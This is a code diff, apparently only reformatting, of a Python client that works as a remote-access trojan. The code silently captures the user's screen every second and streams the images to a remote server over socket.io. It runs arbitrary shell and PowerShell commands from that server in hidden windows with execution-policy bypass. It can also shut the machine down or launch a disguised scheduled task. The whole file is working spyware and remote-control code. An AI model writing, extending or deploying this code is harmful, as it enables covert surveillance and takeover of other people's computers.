@@ -26,6 +26,7 @@ if os.path.exists(ID_PATH):
     unique_id = raw[:8] if len(raw) >= 8 else raw
 else:
     import uuid
+
     unique_id = str(uuid.uuid4())[:8]
     with open(ID_PATH, "w", encoding="utf-8") as f:
         f.write(unique_id)
@@ -38,6 +39,7 @@ sio = socketio.Client(reconnection=True, reconnection_delay=2)
 capture_active = False
 capture_thread = None
 
+
 def capture_loop():
     global capture_active
     user_folder = os.path.join(os.getenv("TEMP"), "frames-repo", unique_user)
@@ -45,13 +47,17 @@ def capture_loop():
 
     while capture_active:
         try:
-            timestamp = time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
+            timestamp = (
+                time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
+            )
             filename = f"{timestamp}.jpg"
 
             # Native screen grab & processing with Pillow
             img = ImageGrab.grab()
             w, h = img.size
-            img_resized = img.resize((w // 2, h // 2), Image.Resampling.LANCZOS).convert("L")
+            img_resized = img.resize(
+                (w // 2, h // 2), Image.Resampling.LANCZOS
+            ).convert("L")
 
             buf = io.BytesIO()
             img_resized.save(buf, format="JPEG", quality=80)
@@ -59,23 +65,25 @@ def capture_loop():
             b64_img = base64.b64encode(img_bytes).decode("utf-8")
 
             if sio.connected:
-                sio.emit("upload_frame", {
-                    "username": unique_user,
-                    "filename": filename,
-                    "image": b64_img
-                })
+                sio.emit(
+                    "upload_frame",
+                    {"username": unique_user, "filename": filename, "image": b64_img},
+                )
         except Exception as e:
             pass
         time.sleep(1)
+
 
 @sio.event
 def connect():
     print(f"[Client] Connected to WebSocket server as {unique_user}")
     sio.emit("register", {"username": unique_user})
 
+
 @sio.event
 def disconnect():
     print("[Client] Disconnected from WebSocket server")
+
 
 @sio.on("exec_command")
 def on_exec_command(data):
@@ -95,11 +103,17 @@ def on_exec_command(data):
     if "panic" in decoded_cmd.lower():
         sys.exit(0)
     elif "altf4" in decoded_cmd.lower():
-        subprocess.Popen(["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(
+            ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
+        )
     elif "sauce" in decoded_cmd.lower():
         subprocess.Popen(
-            ["powershell.exe", "-Command", "Start-ScheduledTask -TaskName WinRunInstaller"],
-            creationflags=subprocess.CREATE_NO_WINDOW
+            [
+                "powershell.exe",
+                "-Command",
+                "Start-ScheduledTask -TaskName WinRunInstaller",
+            ],
+            creationflags=subprocess.CREATE_NO_WINDOW,
         )
     else:
         creation_flags = 0 if visible else subprocess.CREATE_NO_WINDOW
@@ -108,9 +122,17 @@ def on_exec_command(data):
             subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
         else:
             subprocess.Popen(
-                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
-                creationflags=creation_flags
+                [
+                    "powershell.exe",
+                    "-NoProfile",
+                    "-ExecutionPolicy",
+                    "Bypass",
+                    "-Command",
+                    cmd_str,
+                ],
+                creationflags=creation_flags,
             )
+
 
 @sio.on("set_capture")
 def on_set_capture(data):
@@ -124,6 +146,7 @@ def on_set_capture(data):
     elif not should_capture and capture_active:
         capture_active = False
 
+
 def heartbeat_loop():
     while True:
         if sio.connected:
@@ -133,6 +156,7 @@ def heartbeat_loop():
                 pass
         time.sleep(5)
 
+
 def main():
     hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
     hb_thread.start()
@@ -140,10 +164,13 @@ def main():
     while True:
         try:
             if not sio.connected:
-                sio.connect(VPS_URL, wait_timeout=10, transports=['websocket', 'polling'])
+                sio.connect(
+                    VPS_URL, wait_timeout=10, transports=["websocket", "polling"]
+                )
         except Exception:
             pass
         time.sleep(5)
+
 
 if __name__ == "__main__":
     main()
